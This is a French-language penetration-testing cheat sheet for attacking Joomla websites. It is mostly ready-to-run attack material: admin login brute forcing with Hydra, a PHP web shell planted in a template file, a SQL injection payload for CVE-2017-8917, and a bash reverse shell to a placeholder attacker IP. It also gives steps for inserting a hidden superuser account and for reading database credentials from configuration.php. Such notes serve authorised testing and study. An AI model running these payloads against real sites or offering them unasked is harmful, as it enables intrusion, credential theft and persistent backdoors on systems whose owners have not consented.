# Joomla

Joomla est le deuxième CMS le plus populaire après WordPress, notamment utilisé pour des sites plus complexes.

## 🔍 Énumération

### Identification
```bash
# Vérifier robots.txt
curl -s $URL/robots.txt | grep -i "joomla\|administrator"

# Rechercher des marqueurs spécifiques
curl -s $URL | grep -i "joomla\|com_content"

# Vérifier le générateur dans les méta-tags
curl -s $URL | grep -i "name=\"generator\""
```

### Scan avec outils spécifiques
```bash
# JoomlaScan
python joomlascan.py -u $URL

# Avec droopescan
droopescan scan joomla --url $URL

# Joomscan
joomscan -u $URL
```

### Recherche de version
```bash
# Vérifier dans les fichiers de base
curl -s $URL/administrator/manifests/files/joomla.xml | grep -i "<version>"
curl -s $URL/language/en-GB/en-GB.xml | grep -i "<version>"

# Vérifier le README
curl -s $URL/README.txt | head -n 5

# Vérifier les fichiers de cache
curl -s $URL/plugins/system/cache/cache.xml | grep -i "<version>"
```

## 🔨 Exploitation

### Brute Force d'identifiants
```bash
# Avec joomla-brute
python joomla-brute.py -u $URL -w /usr/share/wordlists/rockyou.txt -usr admin

# Avec Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt $URL_HOSTNAME http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid username"
```

### Ajout de code malveillant via Template
```bash
# Après connexion en admin:
# 1. Aller dans Extensions > Templates
# 2. Sélectionner un template (ex: protostar)
# 3. Modifier un fichier (ex: error.php)
# 4. Ajouter le code:
<?php system($_GET['cmd']); ?>

# Tester l'exécution de commande
curl "$URL/templates/protostar/error.php?cmd=id"
```

### Exploitation des vulnérabilités spécifiques
```bash
# CVE-2015-8562 (RCE via User-Agent)
# Utiliser l'exploit: https://www.exploit-db.com/exploits/38977

# CVE-2017-8917 (SQLi)
curl -s "$URL/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 1 FROM (SELECT COUNT(*),CONCAT(CONCAT(username,0x3a,password),FLOOR(RAND(0)*2))x FROM joomla_users GROUP BY x)a)"

# CVE-2019-10945 (Directory Traversal)
python joomla_dir_trav.py --url "$URL/administrator/" --username admin --password password --dir /
```

## 🔐 Post-exploitation

### Obtention d'un reverse shell
```bash
# Via le template modifié
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/VOTRE_IP/4444 0>&1'"); ?>

# Obtenir le shell
nc -lvnp 4444
curl "$URL/templates/protostar/error.php"
```

### Création d'un super utilisateur
```bash
# Trouver les informations de connexion à la BDD
cat configuration.php | grep -E "user|password|db"

# Se connecter à la BDD
mysql -u $DBUSER -p$DBPASS $DBNAME

# Créer un nouvel utilisateur admin
INSERT INTO #__users (name, username, email, password, block) 
VALUES ('Hacker', 'hacker', 'hacker@example.com', '$2y$10$8/gZqrUDORcoN3iLmQKPceaotsKQFEEZXAE/OOe8iAx.IQNDkzQNa', 0);
# Ce hash correspond à 'password'

# Ajouter les droits administrateur
INSERT INTO #__user_usergroup_map (user_id, group_id) VALUES (LAST_INSERT_ID(), 8);
```

### Accès aux fichiers sensibles
```bash
# Télécharger configuration.php (contient les identifiants DB)
curl "$URL/templates/protostar/error.php?cmd=cat%20../../../configuration.php"

# Récupérer d'autres fichiers sensibles
curl "$URL/templates/protostar/error.php?cmd=find%20/var/www%20-name%20%22*config*%22%20-type%20f%202>/dev/null"
```

## ⚠️ Erreurs courantes & astuces
- Joomla stocke la configuration dans configuration.php (équivalent à wp-config.php)
- Le préfixe des tables peut varier (remplacer #__ par le préfixe correct)
- Les anciennes versions de Joomla sont particulièrement vulnérables
- Vérifiez les extensions tierces qui peuvent avoir leurs propres vulnérabilités
- L'administration est généralement accessible via /administrator/